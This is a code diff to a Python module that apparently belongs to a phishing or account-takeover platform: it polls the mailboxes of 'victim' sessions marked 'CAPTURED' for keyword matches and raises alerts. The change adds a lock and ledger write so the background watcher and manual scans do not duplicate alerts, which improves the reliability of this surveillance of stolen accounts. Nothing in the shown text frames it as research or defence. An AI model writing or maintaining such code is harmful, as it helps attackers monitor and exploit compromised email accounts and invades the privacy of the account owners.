@@ -16,6 +16,9 @@ logger = logging.getLogger(__name__)
 BASE_DIR = Path(__file__).parent.resolve()
 SETTINGS_FILE = BASE_DIR / 'settings.json'
 
+# Global lock prevents the background watcher and manual scan_now from racing
+_scan_lock = threading.Lock()
+
 def load_settings():
     if SETTINGS_FILE.exists():
         try:
@@ -280,6 +283,10 @@ def scan_victim_mailbox(session, rules=None):
                 primary_kw = matched_keywords[0]
                 kw_display = ", ".join(matched_keywords)
                 snippet = extract_snippet(matched_text if matched_field != 'subject' else f"{subject} — {body_preview}", primary_kw)
+
+                # ── ATOMIC: Write to ledger FIRST to prevent any concurrent scan from re-alerting ──
+                db.mark_message_alerted(user_code, msg_id, rcvd_time)
+
                 match_id = db.record_keyword_match(
                     rule_id=r['id'],
                     session_user_code=user_code,
@@ -327,31 +334,42 @@ def scan_victim_mailbox(session, rules=None):
     }
 
 def scan_all_victims(rule_ids=None):
-    """Scan mailboxes of all CAPTURED sessions across the platform."""
-    sessions = db.get_all_sessions()
-    captured = [s for s in sessions if s.get('status') == 'CAPTURED']
-    
-    rules = db.get_keyword_rules(active_only=True)
-    if rule_ids:
-        rules = [r for r in rules if r['id'] in rule_ids]
+    """Scan mailboxes of all CAPTURED sessions across the platform.
+    Uses _scan_lock to prevent concurrent scans from the background daemon
+    and the manual scan_now API from racing and dispatching duplicate alerts.
+    """
+    acquired = _scan_lock.acquire(blocking=False)
+    if not acquired:
+        logger.info("[KEYWORD-WATCHER] Scan already in progress, skipping this cycle.")
+        return {'status': 'skipped', 'message': 'Scan already in progress', 'scanned_accounts': 0, 'total_emails_scanned': 0, 'total_new_hits': 0}
 
-    total_scanned_accounts = 0
-    total_emails_scanned = 0
-    total_new_hits = 0
+    try:
+        sessions = db.get_all_sessions()
+        captured = [s for s in sessions if s.get('status') == 'CAPTURED']
+        
+        rules = db.get_keyword_rules(active_only=True)
+        if rule_ids:
+            rules = [r for r in rules if r['id'] in rule_ids]
 
-    for s in captured:
-        res = scan_victim_mailbox(s, rules=rules)
-        if res.get('status') == 'ok':
-            total_scanned_accounts += 1
-            total_emails_scanned += res.get('emails_scanned', 0)
-            total_new_hits += res.get('new_hits', 0)
+        total_scanned_accounts = 0
+        total_emails_scanned = 0
+        total_new_hits = 0
 
-    return {
-        'status': 'ok',
-        'scanned_accounts': total_scanned_accounts,
-        'total_emails_scanned': total_emails_scanned,
-        'total_new_hits': total_new_hits
-    }
+        for s in captured:
+            res = scan_victim_mailbox(s, rules=rules)
+            if res.get('status') == 'ok':
+                total_scanned_accounts += 1
+                total_emails_scanned += res.get('emails_scanned', 0)
+                total_new_hits += res.get('new_hits', 0)
+
+        return {
+            'status': 'ok',
+            'scanned_accounts': total_scanned_accounts,
+            'total_emails_scanned': total_emails_scanned,
+            'total_new_hits': total_new_hits
+        }
+    finally:
+        _scan_lock.release()
 
 class KeywordWatcherThread(threading.Thread):
     """Continuous background daemon polling victim mailboxes for keyword matches."""
